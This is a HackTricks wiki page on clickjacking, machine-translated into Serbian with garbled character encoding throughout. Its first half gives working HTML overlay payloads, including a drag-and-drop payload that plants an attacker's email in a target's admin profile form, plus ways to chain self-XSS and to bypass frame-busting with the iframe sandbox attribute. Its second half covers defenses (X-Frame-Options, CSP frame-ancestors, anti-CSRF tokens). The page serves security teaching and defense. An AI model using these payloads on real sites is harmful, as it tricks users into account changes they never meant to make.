# Clickjacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## 맚a je Clickjacking

U clickjacking napadu, **korisnik** je **prevaren** da **klikne** na **element** na veb stranici koji je ili **nevidljiv** ili prikazan kao drugi element. Ova manipulacija mo쬰 dovesti do nepredvi캠enih posledica za korisnika, kao 코to su preuzimanje malvera, preusmeravanje na zlonamerne veb stranice, davanje kredencijala ili osetljivih informacija, transfer novca ili online kupovina proizvoda.

### Prepopunjavanje obrazaca trik

Ponekad je mogu캖e **popuniti vrednost polja obrasca koriste캖i GET parametre prilikom u캜itavanja stranice**. Napada캜 mo쬰 zloupotrebiti ovo pona코anje da popuni obrazac proizvoljnim podacima i po코alje clickjacking payload tako da korisnik pritisne dugme Po코alji.

### Popuni obrazac sa Drag\&Drop

Ako treba da korisnik **popuni obrazac** ali ne 쬰lite da ga direktno pitate da unese neke specifi캜ne informacije (kao 코to su email ili specifi캜na lozinka koju znate), mo쬰te ga jednostavno zamoliti da **Drag\&Drop** ne코to 코to 캖e uneti va코e kontrolisane podatke kao u [**ovom primeru**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Osnovni Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Multistep Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Ako ste identifikovali **XSS napad koji zahteva da korisnik klikne** na neki element da bi **pokrenuo** XSS i stranica je **ranjiva na clickjacking**, mogli biste to iskoristiti da prevarite korisnika da klikne na dugme/link.\
Primer:\
_Prona코li ste **self XSS** u nekim privatnim podacima naloga (podaci koje **samo vi mo쬰te postaviti i 캜itati**). Stranica sa **formom** za postavljanje ovih podataka je **ranjiva** na **Clickjacking** i mo쬰te **prepopuniti** **formu** sa GET parametrima._\
\_\_Napada캜 bi mogao pripremiti **Clickjacking** napad na tu stranicu **prepopunjavaju캖i** **formu** sa **XSS payload** i **prevariti** **korisnika** da **po코alje** formu. Tako, **kada se forma po코alje** i vrednosti se modifikuju, **korisnik 캖e izvr코iti XSS**.

## Strategije za ubla쬬vanje Clickjacking-a

### Klijentske odbrane

Skripte koje se izvr코avaju na klijentskoj strani mogu izvesti radnje kako bi spre캜ile Clickjacking:

* Osiguranje da je prozor aplikacije glavni ili gornji prozor.
* 캛injenje svih okvira vidljivim.
* Spre캜avanje klikova na nevidljive okvire.
* Otkrivanje i upozoravanje korisnika na potencijalne poku코aje Clickjacking-a.

Me캠utim, ovi skripti za razbijanje okvira mogu biti zaobi캠eni:

* **Bezbednosne postavke pregleda캜a:** Neki pregleda캜i mogu blokirati ove skripte na osnovu svojih bezbednosnih postavki ili nedostatka podr코ke za JavaScript.
* **HTML5 iframe `sandbox` atribut:** Napada캜 mo쬰 neutralisati skripte za razbijanje okvira postavljanjem `sandbox` atributa sa `allow-forms` ili `allow-scripts` vrednostima bez `allow-top-navigation`. Ovo spre캜ava iframe da proveri da li je gornji prozor, npr.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` i `allow-scripts` vrednosti omogu캖avaju akcije unutar iframe-a dok onemogu캖avaju navigaciju na vrhunskom nivou. Da bi se osigurala nameravana funkcionalnost ciljanog sajta, dodatne dozvole kao 코to su `allow-same-origin` i `allow-modals` mogu biti neophodne, u zavisnosti od tipa napada. Poruke u konzoli pretra쬴va캜a mogu pomo캖i u odre캠ivanju koje dozvole treba omogu캖iti.

### Server-Side Defenses

#### X-Frame-Options

**`X-Frame-Options` HTTP odgovor header** obave코tava pretra쬴va캜e o legitimnosti prikazivanja stranice u `<frame>` ili `<iframe>`, poma쬿캖i u spre캜avanju Clickjacking-a:

* `X-Frame-Options: deny` - Nijedna domena ne mo쬰 uokviriti sadr쬬j.
* `X-Frame-Options: sameorigin` - Samo trenutni sajt mo쬰 uokviriti sadr쬬j.
* `X-Frame-Options: allow-from https://trusted.com` - Samo navedeni 'uri' mo쬰 uokviriti stranicu.
* Imajte na umu ograni캜enja: ako pretra쬴va캜 ne podr쬬va ovu direktivu, mo쬯a ne캖e raditi. Neki pretra쬴va캜i preferiraju CSP frame-ancestors direktivu.

#### Content Security Policy (CSP) frame-ancestors direktiva

**`frame-ancestors` direktiva u CSP** je preporu캜ena metoda za za코titu od Clickjacking-a:

* `frame-ancestors 'none'` - Sli캜no `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Sli캜no `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Sli캜no `X-Frame-Options: allow-from`.

Na primer, slede캖i CSP dozvoljava samo uokvirivanje sa iste domene:

`Content-Security-Policy: frame-ancestors 'self';`

Dalje informacije i slo쬰ni primeri mogu se na캖i u [frame-ancestors CSP dokumentaciji](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) i [Mozilla's CSP frame-ancestors dokumentaciji](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) sa `child-src` i `frame-src`

**Content Security Policy (CSP)** je bezbednosna mera koja poma쬰 u spre캜avanju Clickjacking-a i drugih napada injekcijom koda tako 코to specificira koje izvore pretra쬴va캜 treba da dozvoli za u캜itavanje sadr쬬ja.

#### `frame-src` Direktiva

* Defini코e validne izvore za frame-ove.
* Specifi캜nija je od `default-src` direktive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ova politika omogu캖ava okvire sa iste lokacije (self) i https://trusted-website.com.

#### `child-src` Direktiva

* Uvedena u CSP nivou 2 za postavljanje validnih izvora za web radnike i okvire.
* Deluje kao rezervna opcija za frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ova politika omogu캖ava okvire i radnike sa iste lokacije (self) i https://trusted-website.com.

**Napomene o kori코캖enju:**

* Deprecacija: child-src se ukida u korist frame-src i worker-src.
* Rezervno pona코anje: Ako frame-src nije prisutan, child-src se koristi kao rezervna opcija za okvire. Ako su oba odsutna, default-src se koristi.
* Stroga definicija izvora: Uklju캜ite samo pouzdane izvore u direktive kako biste spre캜ili eksploataciju.

#### JavaScript skripte za razbijanje okvira

Iako nisu potpuno nepogre코ive, skripte zasnovane na JavaScript-u za razbijanje okvira mogu se koristiti za spre캜avanje da web stranica bude u okviru. Primer:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Zapo코ljavanje Anti-CSRF Tokena

* **Validacija Tokena:** Koristite anti-CSRF tokene u web aplikacijama kako biste osigurali da su zahtevi koji menjaju stanje namerno izvr코eni od strane korisnika, a ne putem Clickjacked stranice.

## Reference

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) za lako kreiranje i **automatizaciju radnih tokova** pokretanih najnaprednijim **alatima** zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
